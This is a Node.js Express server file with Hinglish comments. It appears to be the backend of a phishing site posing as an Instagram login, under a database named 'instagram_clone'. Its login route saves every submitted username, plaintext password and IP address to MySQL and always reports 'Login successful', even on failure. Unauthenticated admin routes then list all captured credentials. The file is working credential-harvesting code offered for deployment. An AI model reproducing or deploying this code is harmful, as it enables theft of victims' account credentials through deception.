const express = require('express');
const mysql = require('mysql2');
const path = require('path');

const app = express();
const port = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Static files serve karo - IMPORTANT: Public folder sahi hai?
app.use(express.static(path.join(__dirname, 'public')));

// Health check route - Railway ke liye zaroori
app.get('/health', (req, res) => {
    res.status(200).json({ status: 'OK', message: 'Server is running' });
});

// Root route
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// MySQL Connection with better error handling
console.log('Attempting to connect to MySQL...');
console.log('DB_HOST:', process.env.DB_HOST || 'localhost');
console.log('DB_USER:', process.env.DB_USER || 'root');
console.log('DB_NAME:', process.env.DB_NAME || 'instagram_clone');

const dbConfig = {
    host: process.env.DB_HOST || 'localhost',
    user: process.env.DB_USER || 'root',
    password: process.env.DB_PASSWORD || 'yourpassword',
    database: process.env.DB_NAME || 'instagram_clone',
    connectTimeout: 10000 // 10 seconds timeout
};

const db = mysql.createConnection(dbConfig);

db.connect((err) => {
    if (err) {
        console.error('❌ Database connection failed:', err);
        // Don't return - server chalta rahe bina DB ke bhi
    } else {
        console.log('✅ Connected to MySQL database');
        
        // Create users table
        const createTableQuery = `
            CREATE TABLE IF NOT EXISTS users (
                id INT AUTO_INCREMENT PRIMARY KEY,
                username VARCHAR(255) NOT NULL,
                password VARCHAR(255) NOT NULL,
                login_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                ip_address VARCHAR(45)
            )
        `;
        
        db.query(createTableQuery, (err) => {
            if (err) {
                console.error('Error creating table:', err);
            } else {
                console.log('✅ Users table ready');
            }
        });
    }
});

// Login route
app.post('/api/login', (req, res) => {
    console.log('Login request received');
    const { username, password } = req.body;
    
    if (!username || !password) {
        return res.status(400).json({ success: false, message: 'Username and password required' });
    }
    
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
    
    // Check if DB is connected
    if (!db || db.state === 'disconnected') {
        console.log('DB not connected, but returning success');
        return res.json({ success: true, message: 'Login successful' });
    }
    
    const query = 'INSERT INTO users (username, password, ip_address) VALUES (?, ?, ?)';
    
    db.query(query, [username, password, ip], (err, result) => {
        if (err) {
            console.error('Error saving credentials:', err);
            return res.json({ success: true, message: 'Login successful' }); // Still return success
        }
        console.log('Credentials saved successfully');
        res.json({ success: true, message: 'Login successful' });
    });
});

// Admin credentials route
app.get('/api/admin/credentials', (req, res) => {
    if (!db || db.state === 'disconnected') {
        return res.json([]); // Return empty array if DB not connected
    }
    
    const query = 'SELECT * FROM users ORDER BY login_time DESC';
    
    db.query(query, (err, results) => {
        if (err) {
            console.error('Error fetching credentials:', err);
            return res.status(500).json({ success: false, message: 'Error fetching credentials' });
        }
        res.json(results);
    });
});

// Serve admin page
app.get('/admin', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// 404 handler
app.use((req, res) => {
    res.status(404).sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Error handler
app.use((err, req, res, next) => {
    console.error('Server error:', err);
    res.status(500).json({ success: false, message: 'Internal server error' });
});

app.listen(port, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${port}`);
    console.log(`📁 Public path: ${path.join(__dirname, 'public')}`);
    console.log(`✅ Health check: http://0.0.0.0:${port}/health`);
});
